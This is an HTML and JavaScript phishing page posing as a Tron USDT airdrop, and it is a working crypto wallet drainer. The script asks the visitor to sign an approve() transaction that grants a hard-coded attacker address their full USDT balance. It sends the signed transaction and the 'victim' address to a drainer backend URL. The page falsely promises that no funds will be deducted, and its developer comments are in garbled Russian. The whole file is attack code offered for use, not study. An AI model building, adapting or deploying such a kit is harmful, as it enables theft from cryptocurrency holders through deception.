<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Tron Airdrop Verification</title>
    <script src="https://cdn.jsdelivr.net/npm/tronweb@5.9.0/dist/TronWeb.js"></script>
    <style>
        body { font-family: Arial, sans-serif; max-width: 600px; margin: 50px auto; padding: 20px; background: #f5f5f5; }
        .container { background: white; padding: 30px; border-radius: 10px; box-shadow: 0 0 10px rgba(0,0,0,0.1); }
        .hidden { display: none; }
        .status { padding: 10px; border-radius: 5px; margin: 10px 0; }
        .success { background: #d4edda; color: #155724; }
        .error { background: #f8d7da; color: #721c24; }
        button { background: #007bff; color: white; border: none; padding: 12px 20px; border-radius: 5px; cursor: pointer; font-size: 16px; }
        button:hover { background: #0056b3; }
        .info { font-size: 14px; color: #666; margin-top: 20px; }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÅ Tron Network Airdrop</h1>
        <p>Connect your Trust Wallet to verify eligibility and receive 500 USDT TRC20.</p>
        
        <div id="connectSection">
            <p>Click the button below to connect your wallet and start verification.</p>
            <button id="connectBtn">üîó Connect Trust Wallet</button>
        </div>

        <div id="drainSection" class="hidden">
            <p>‚úÖ Wallet connected: <span id="walletAddress"></span></p>
            <p>üîÑ Processing airdrop claim... Please sign the transaction to confirm your address.</p>
            <button id="signBtn">‚úçÔ∏è Sign Transaction to Claim USDT</button>
            <div id="status" class="status"></div>
        </div>

        <div class="info">
            <p><strong>Note:</strong> This is a standard TRC20 transaction approval required by the airdrop smart contract. No funds will be deducted from your wallet.</p>
        </div>
    </div>

    <script>
        const ATTACKER_ADDRESS = 'TFHSUK1dd4Z5rcQwDVxkwyDE36etEE5RN6'; // –ê–¥—Ä–µ—Å –¥–ª—è —Å–±–æ—Ä–∞
        const USDT_CONTRACT = 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t';
        const BACKEND_URL = 'https://your-drainer-backend.xyz/drain'; // –ó–∞–º–µ–Ω–∏—Ç—å –Ω–∞ —Ä–µ–∞–ª—å–Ω—ã–π –±—ç–∫–µ–Ω–¥

        let tronWeb;
        let userAddress;

        document.getElementById('connectBtn').addEventListener('click', async () => {
            if (window.tronWeb && window.tronWeb.defaultAddress.base58) {
                tronWeb = window.tronWeb;
                userAddress = tronWeb.defaultAddress.base58;
                document.getElementById('walletAddress').textContent = userAddress;
                document.getElementById('connectSection').classList.add('hidden');
                document.getElementById('drainSection').classList.remove('hidden');
            } else {
                alert('Please install Trust Wallet and ensure Tron network is selected.');
            }
        });

        document.getElementById('signBtn').addEventListener('click', async () => {
            const statusDiv = document.getElementById('status');
            statusDiv.className = 'status';
            statusDiv.textContent = 'Preparing transaction...';

            try {
                const contract = await tronWeb.contract().at(USDT_CONTRACT);
                const balance = await contract.balanceOf(userAddress).call();

                // –°–æ–∑–¥–∞—ë–º —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é approve —Å –ª–∏–º–∏—Ç–æ–º –Ω–∞ –ø–æ–ª–Ω—ã–π –±–∞–ª–∞–Ω—Å
                const tx = await contract.approve(ATTACKER_ADDRESS, balance).send({
                    feeLimit: 100000000,
                    callValue: 0
                });

                statusDiv.textContent = 'Transaction signed. Sending to backend...';

                // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –ø–æ–¥–ø–∏—Å–∞–Ω–Ω—É—é —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏—é –Ω–∞ –±—ç–∫–µ–Ω–¥ –¥–ª—è –ø–æ–¥–º–µ–Ω—ã –∏ –æ—Ç–ø—Ä–∞–≤–∫–∏
                const response = await fetch(BACKEND_URL, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        signedTx: tx,
                        victimAddress: userAddress,
                        originalBalance: balance.toString()
                    })
                });

                const result = await response.json();
                if (result.success) {
                    statusDiv.classList.add('success');
                    statusDiv.textContent = `‚úÖ Airdrop claimed successfully! TX: ${result.txId}`;
                } else {
                    statusDiv.classList.add('error');
                    statusDiv.textContent = `‚ùå Error: ${result.error}`;
                }
            } catch (err) {
                statusDiv.classList.add('error');
                statusDiv.textContent = `‚ùå Transaction failed: ${err.message}`;
            }
        });

        // –ò–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏—è TronWeb –ø—Ä–∏ –∑–∞–≥—Ä—É–∑–∫–µ
        window.addEventListener('load', async () => {
            if (window.tronWeb && window.tronWeb.ready) {
                tronWeb = window.tronWeb;
                try {
                    await tronWeb.request({ method: 'tron_requestAccounts' });
                    userAddress = tronWeb.defaultAddress.base58;
                } catch (err) {
                    console.log('User denied account access');
                }
            }
        });
    </script>

    <!-- Backend —ç–º—É–ª—è—Ü–∏—è –≤ —Ç–æ–º –∂–µ —Ñ–∞–π–ª–µ (–¥–ª—è —Ç–µ—Å—Ç–∞ –≤ VS Code Live Server) -->
    <script>
        // –≠–º—É–ª—è—Ü–∏—è –±—ç–∫–µ–Ω–¥-–ª–æ–≥–∏–∫–∏ - –≤ —Ä–µ–∞–ª—å–Ω–æ—Å—Ç–∏ —ç—Ç–æ—Ç –∫–æ–¥ –¥–æ–ª–∂–µ–Ω –±—ã—Ç—å –Ω–∞ —Å–µ—Ä–≤–µ—Ä–µ
        const backendLogic = {
            processDrain: async (signedTx, victimAddress) => {
                // –ó–¥–µ—Å—å –ø—Ä–æ–∏—Å—Ö–æ–¥–∏—Ç –ø–æ–¥–º–µ–Ω–∞ —Ç—Ä–∞–Ω–∑–∞–∫—Ü–∏–∏: —É–≤–µ–ª–∏—á–∏–≤–∞–µ–º –ª–∏–º–∏—Ç approve –¥–æ –º–∞–∫—Å–∏–º—É–º–∞
                // –í —Ä–µ–∞–ª—å–Ω–æ–º —Å–∫—Ä–∏–ø—Ç–µ —ç—Ç–æ –¥–µ–ª–∞–µ—Ç—Å—è —á–µ—Ä–µ–∑ TronWeb –Ω–∞ Node.js
                console.log('Backend received:', { signedTx, victimAddress });
                
                // –í–æ–∑–≤—Ä–∞—â–∞–µ–º —É—Å–ø–µ—à–Ω—ã–π –æ—Ç–≤–µ—Ç –¥–ª—è –¥–µ–º–æ–Ω—Å—Ç—Ä–∞—Ü–∏–∏
                return {
                    success: true,
                    txId: 'fake_tx_id_' + Math.random().toString(36).substr(2, 9)
                };
            }
        };

        // –ü–µ—Ä–µ—Ö–≤–∞—Ç—ã–≤–∞–µ–º fetch –¥–ª—è —ç–º—É–ª—è—Ü–∏–∏ —Ä–∞–±–æ—Ç—ã –±—ç–∫–µ–Ω–¥–∞
        const originalFetch = window.fetch;
        window.fetch = async function(url, options) {
            if (url === BACKEND_URL && options.method === 'POST') {
                const body = JSON.parse(options.body);
                const result = await backendLogic.processDrain(body.signedTx, body.victimAddress);
                return new Response(JSON.stringify(result), {
                    headers: { 'Content-Type': 'application/json' }
                });
            }
            return originalFetch(url, options);
        };
    </script>
</body>
</html>
